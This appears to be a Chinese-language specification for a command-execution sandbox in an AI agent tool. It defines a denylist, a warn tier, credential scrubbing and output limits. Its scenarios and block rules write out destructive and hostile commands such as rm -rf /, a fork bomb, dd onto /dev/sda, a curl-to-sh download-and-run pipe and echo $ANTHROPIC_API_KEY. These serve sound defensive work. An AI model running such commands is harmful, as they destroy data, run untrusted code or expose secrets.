# exec-sandbox Specification

## Purpose
TBD - created by archiving change exec-sandbox. Update Purpose after archive.
## Requirements
### Requirement: 命令执行受约束

`executeCommand` MUST 在一道受约束执行层下运行获准的命令，约束由一个配置驱动的不可变策略对象（`SandboxPolicy`）+ 一个承载 denylist/输出上限/env 脱敏逻辑的策略组件（`CommandGuard`）承载，逻辑 MUST 集中于该组件而非散落在 `executeCommand` 内。该层与 `tool-permissions`（may-run）、`tool-availability`（visibility）**正交叠加**：权限决定「能否运行」，沙箱决定「运行时被约束到什么程度」。OS 原生 shell 选择（`buildInvocation`）MUST 保持不变。缺省（未注入策略/无配置块）时 MUST 使用保守内置默认，且行为对既有单测零回归。

#### Scenario: 无配置时用保守默认
- **WHEN** 未提供 `sandbox` 配置块（或未注入策略）
- **THEN** 生效策略为「保守内置 denylist + 输出上限 200_000 字节 + 超时 30s + env 脱敏开 + 不限 cwd」，且 `buildInvocation` 的 PowerShell/bash 选择与今天一致

#### Scenario: 非法配置值被容错钳制
- **WHEN** 配置给出非法值（`max-output-bytes<=0` 或 `timeout-seconds<=0`）
- **THEN** 策略把该值钳制回安全默认（而非崩溃或关闭约束），始终保留超时与输出上限

### Requirement: 灾难性命令 denylist（保守拦截，两遍分类）

系统 MUST 内置一组**真正灾难性**命令模式作为**安全底线**并对**规范化后的命令**（折叠空白、大小写不敏感）做正则匹配；命中 MUST 拒绝执行、MUST NOT spawn 进程、MUST 返回规范错误结果 `{"error":"blocked: <类别>"}`（拒因只报类别、不回显原命令、凭据安全）、MUST NOT 抛异常中断回合。

判定 MUST 采用**两遍、最严者胜**分类而非单遍整串匹配（整串匹配存在 `echo ok && rm -rf /` 之类绕过）：(1) 对**整条**命令扫描**结构型**模式（fork bomb、`while true … & done` 循环、下载管道入 shell 等跨操作符模式）；(2) 按 shell 操作符（`;`、`&&`、`||`、`|`、`&`，**引号感知**——不切分引号内的操作符）拆分为子命令，对**每个子命令**独立匹配单命令规则。任一命中即拦。

分类 MUST 是**三级、最严者胜**（`block` > `warn` > `pass`）：`block`（灾难性底线，本需求）拒绝执行；`warn`（中危提示，见「中间 warn 层」需求）照常执行但追加提示；其余 `pass` 静默照常执行。三级共用同一套两遍结构（整串结构型扫描 + 引号感知子命令拆分）。**block 严格优先于 warn**：一条同时命中 block 与 warn 模式的命令 MUST 判为 `block`（不执行）。warn 层 MUST NOT 改变 block/pass 的既有返回契约——被拦仍返回 `{"error":"blocked: <类别>"}`，未拦仍照常执行；`checkDenied` 语义 MUST 保持只反映 `block`（命中 warn 的命令对 `checkDenied` 仍为「未拦」）。

内置底线 MUST 至少覆盖：递归删除根/家目录（`rm -rf /`、`rm -rf ~`、`Remove-Item` 递归删盘符根/家）、磁盘格式化/分区（`mkfs`、`format <盘符>:`、`diskpart`）、下载管道执行安装（`curl … | sh`、`wget … | bash`、PowerShell `iex` 下载执行）、fork bomb、`shutdown`/`reboot`/`halt`/`poweroff`、覆写块设备（`dd of=/dev/…`）、对根目录 `chmod -R 777 /`。内置底线 MUST NOT 可被配置削弱或清空；配置 `exec.denylist` MUST 只能在底线之上**追加**用户正则（非法正则 MUST 跳过并记日志，不影响其余规则）。匹配 MUST 保守：MUST NOT 拦截正常开发命令。

#### Scenario: 灾难命令被拦且不执行
- **WHEN** 模型调用 `executeCommand("rm -rf /")`（或 `mkfs …`、`curl http://x | sh`、`:(){:|:&};:`、`shutdown -h now`、`dd if=/dev/zero of=/dev/sda`、`chmod -R 777 /`、`Remove-Item -Recurse -Force C:\` 等灾难模式）
- **THEN** 命令不被 spawn，工具返回 `{"error":"blocked: <类别>"}`，拒因不含原命令内容

#### Scenario: 隐藏在操作符后的灾难子命令被拦
- **WHEN** 模型调用复合命令（如 `echo ok && rm -rf /`、`true; rm -rf ~`、`cat x | rm -rf /`）
- **THEN** 拆分后的危险子命令命中单命令规则，整条被拦、不执行

#### Scenario: 引号内的操作符不被误切分
- **WHEN** 模型调用 `git commit -m "a && b"` 或 `echo "safe ; text"`
- **THEN** 引号内的 `&&`/`;` 不触发拆分，命令不被误伤

#### Scenario: 正常开发命令不被误伤
- **WHEN** 模型调用正常命令（如 `mvn -q test`、`git commit -m "…"`、`npm install`、`npm run format`、`ls -la`、`rm -rf target`、`rm -rf ./node_modules`、`rm -f file.txt`、`chmod -R 755 ./dir`、`Remove-Item -Recurse -Force .\target`、`curl https://api.example.com/data`、`dd if=in of=out.bin`）
- **THEN** 均不命中 denylist，照常执行

#### Scenario: 内置底线不可被配置关闭，用户可追加
- **WHEN** 配置把 `exec.denylist` 设为空数组，或追加一条自定义正则
- **THEN** 内置灾难模式仍全部生效（空配置不削弱底线）；追加的合法正则叠加生效；非法正则被跳过且不影响其余规则

#### Scenario: block 优先于 warn（最严者胜）
- **WHEN** 一条命令同时命中 warn 模式与 block 模式（如 `chmod -R 777 /`——命中 warn 的「chmod 777」又命中 block 的「对根目录 chmod 777」；或 `sudo rm -rf /`——命中 warn 的 `sudo` 又命中 block 的「递归删根」）
- **THEN** 判为 `block`，命令不被 spawn、返回 `{"error":"blocked: <类别>"}`（warn 不降级 block）

#### Scenario: 命中 warn 的命令对 checkDenied 仍为未拦
- **WHEN** 一条命令仅命中 warn 模式（如 `pip install foo`、`chmod 777 ./localfile`）而不命中任何 block 模式
- **THEN** `checkDenied` 返回「未拦」（block/pass 契约不变），命令照常执行（warn 提示由 warn 层追加，见下）

### Requirement: 命令输入校验

在任何正则匹配之前，系统 MUST 对命令做廉价输入校验：空/空白命令、长度超过约 10_000 字符、含 NUL（`\x00`）字节的命令 MUST 被拒绝执行并返回规范错误结果（不 spawn）。审计日志行记录被拦命令时 MUST 先经凭据脱敏（复用 `CredentialSanitizer`）且长度受限，绝不明文回显密钥。

#### Scenario: 非法输入被拒
- **WHEN** 命令为空/空白、超长（>10_000 字符）、或含 NUL 字节
- **THEN** 命令不被 spawn，返回规范错误（分别为 empty/too long/null byte 类别）

#### Scenario: 审计日志脱敏
- **WHEN** 一条被拦命令写入审计日志
- **THEN** 日志中的命令经凭据脱敏且截断，不出现明文 API key/token

### Requirement: 输出上限（防 OOM）

`executeCommand` 捕获子进程输出时 MUST 有界读取，最多保留 `exec.max-output-bytes`（默认 200_000）字节；超限时 MUST 继续 drain 丢弃剩余输出（避免管道写满阻塞子进程）、MUST 在保留内容后追加清晰的截断标记。MUST NOT 使用无上限的 `readAllBytes()` 语义。

#### Scenario: 超长输出被截断并标记
- **WHEN** 子进程产出超过上限的输出
- **THEN** 工具只保留上限内的字节并追加截断标记，进程不因内存耗尽而崩溃

#### Scenario: 正常输出不受影响
- **WHEN** 子进程输出小于上限
- **THEN** 输出原样返回，无截断标记

### Requirement: 子进程环境凭据脱敏

`executeCommand` 在 `exec.scrub-env` 为真（默认）时 MUST NOT 把父进程的凭据类环境变量传给子进程——MUST 按名剔除凭据类变量（名字含 `TOKEN`/`SECRET`/`PASSWORD`/`CREDENTIAL`/`APIKEY`/`_KEY` 或以 `KEY` 结尾，含 `ANTHROPIC_API_KEY` 等），MUST 保留正常变量（`PATH`/`HOME`/`LANG` 等）以不破坏正常命令。脱敏 MUST 产出新的环境映射，MUST NOT 修改父进程环境。`scrub-env=false` 时按旧行为原样透传。

#### Scenario: 凭据变量不进入子进程
- **WHEN** 父进程环境含 `ANTHROPIC_API_KEY` 且 `scrub-env` 为真，agent 尝试 `echo $ANTHROPIC_API_KEY`
- **THEN** 子进程环境不含该变量，密钥不被回显给模型；`PATH` 等正常变量仍在，正常命令不受影响

#### Scenario: 关闭脱敏则原样透传
- **WHEN** `scrub-env=false`
- **THEN** 子进程继承完整父进程环境（旧行为）

### Requirement: 可配置超时与工作目录

`executeCommand` 的超时 MUST 由 `exec.timeout-seconds`（默认 30）驱动（取代硬编码 30s），超时未完成 MUST 强制销毁进程并返回已捕获（且已受上限约束）的输出。当 `exec.working-dir` 非空时子进程 MUST 在该目录运行；为空时继承当前工作目录。超时/工作目录 MUST 经 `ProcessBuilder` 施加，且 MUST 可在不 spawn 真实进程的前提下断言其配置。

#### Scenario: 超时可配置并生效
- **WHEN** `timeout-seconds` 配为 N 且命令在 N 秒内未完成
- **THEN** 进程被强制销毁，返回超时提示 + 已捕获（受上限约束）的输出

#### Scenario: 工作目录被施加
- **WHEN** `working-dir` 指向某目录且 agent 执行命令
- **THEN** `ProcessBuilder` 的工作目录被设为该目录（可不 spawn 断言）；`working-dir` 为空时不设置、继承当前目录

### Requirement: 中间 warn 层（medium-risk 提示，不改 block/pass 契约）

系统 MUST 提供一个介于 block 与 pass 之间的 **warn 中危层**：一组**中危但合法**的命令模式（保守内置默认集），命中 warn（且不命中 block）的命令 MUST **照常执行**，但工具结果 MUST 追加一条 `⚠️ Warning: <类别>` 提示（拒因只报类别、不回显原命令、凭据安全），使模型看得见风险并可据此调整。warn 是**纯追加**行为：MUST NOT 改变 block/pass 二元契约——不阻断执行、不改变退出码/超时语义、不把成功结果变成 `{"error"}`。

warn 判定 MUST 复用 block 的两遍结构（整串结构型扫描 + 引号感知子命令拆分），并遵循**最严者胜**：先判 block，未命中再判 warn，均未命中为 pass。因此复合命令中**任一 warn 子命令**命中即整条追加 warn 提示；而同时命中 block 的命令归 block（不追加 warn、直接拦）。

保守内置 warn 集 MUST 至少覆盖：`pip install`、`apt`/`apt-get install`、`sudo`/`su`（提权）、对**非根/家路径**的 `chmod 777`/`chmod -R 777`、`PATH=` 重赋值、`npm install -g`（全局安装）。内置集 MUST 保守——正常开发命令（`mvn`/`git`/`npm run`/`ls`/`cat`/删项目文件/`chmod -R 755`）MUST NOT 触发 warn（保持静默）。配置 `exec.warnlist`（`List<String>`）MUST 只能在内置集之上**追加**用户正则（非法正则 MUST 跳过并记日志，不影响其余规则）；缺省即内置集，`warnlist` 承载于 `SandboxPolicy` 值对象。

#### Scenario: warn 命令照常执行并追加提示
- **WHEN** 模型调用中危命令（如 `pip install requests`、`sudo systemctl restart x`、`apt-get install foo`、`chmod 777 ./localfile`、`npm install -g typescript`、`PATH=/custom:$PATH mycmd`）且不命中任何 block 模式
- **THEN** 命令照常 spawn 执行，工具结果在原输出后追加 `⚠️ Warning: <类别>`，且 block/pass 返回契约不变（成功结果不变为 `{"error"}`）

#### Scenario: 正常开发命令保持静默（无提示）
- **WHEN** 模型调用正常命令（如 `mvn -q test`、`git commit -m "…"`、`npm install`、`npm run build`、`ls -la`、`cat pom.xml`、`chmod -R 755 ./dir`）
- **THEN** 既不被拦也不命中 warn，工具结果**不含**任何 `⚠️ Warning` 提示（与今天逐字节一致）

#### Scenario: 复合命令中的 warn 子命令触发提示
- **WHEN** 模型调用复合命令且某个子命令命中 warn（如 `git pull && pip install -r req.txt`、`cd /tmp && sudo apt install foo`）而整条不命中 block
- **THEN** 命令照常执行，工具结果追加 `⚠️ Warning: <类别>`（子命令级 warn 生效）

#### Scenario: warn 配置只追加、非法正则跳过
- **WHEN** 配置把 `exec.warnlist` 追加一条自定义正则，或追加一条非法正则，或设为空数组
- **THEN** 内置 warn 集仍全部生效（空配置不削弱内置集）；追加的合法正则叠加为新的 warn 模式；非法正则被跳过且不影响其余规则

